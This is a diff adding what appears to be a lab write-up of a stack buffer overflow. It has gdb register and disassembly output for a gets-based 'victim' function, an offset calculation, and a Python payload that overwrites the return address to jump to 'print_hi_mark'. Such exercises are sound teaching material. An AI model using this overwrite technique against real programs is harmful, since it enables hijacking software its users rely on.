@@ -1,0 +1,48 @@
+(gdb) info address print_hi_mark
+Symbol "print_hi_mark" is a function at address 0x8048efe.
+
+(gdb) info reg
+eax            0x1   1
+ecx            0xbffff370  -1073745040
+edx            0xb   11
+ebx            0x0   0
+esp            0xbffeccfc  0xbffeccfc
+ebp            0xbffecd08  0xbffecd08
+esi            0x0   0
+edi            0x8049760   134518624
+eip            0x8048f1c   0x8048f1c <victim>
+eflags         0x200286 [ PF SF IF ID ]
+cs             0x73  115
+ss             0x7b  123
+ds             0x7b  123
+es             0x7b  123
+fs             0x0   0
+gs             0x33  51
+
+(gdb) disas victim
+Dump of assembler code for function victim:
+=> 0x08048f1c <+0>:  push   %ebp
+   0x08048f1d <+1>:  mov    %esp,%ebp
+   0x08048f1f <+3>:  sub    $0x28,%esp
+   0x08048f22 <+6>:  lea    -0xc(%ebp),%eax
+   0x08048f25 <+9>:  mov    %eax,(%esp)
+   0x08048f28 <+12>: call   0x8049c50 <gets>
+   0x08048f2d <+17>: leave  
+   0x08048f2e <+18>: ret    
+End of assembler dump.
+
+Initially, we have esp = 0xbffeccfc, and ebp = 0xbffecd08
+Tracing through each step in the disassembled victim():
+esp = esp - 4 = 0xbffeccf8
+[0xbffeccf8] = 0xbffecd08
+ebp = esp = 0xbffeccf8
+esp = esp - 0x28 = 0xbffeccd0
+eax = [ebp - 0xc] = [0xbffeccf8 - 0xc] = [0xbffeccec]
+[esp] = eax -> [0xbffeccd0] = [0xbffeccec]
+syscall for gets.
+
+So we see that input[4] is stored at 0xbffeccec, and the return address is stored at 0xbffeccfc. 0xbffeccfc -  0xbffeccec= 0x10 = 16.
+so if we input 16 characters, followed by the address of "print_hi_mark" (0x8048efe), we would be able to change the return address to run print_hi_mark() upon return.
+Hence, we can use:
+from struct import pack
+print "0"*16 + pack("<I", 0x8048efe)
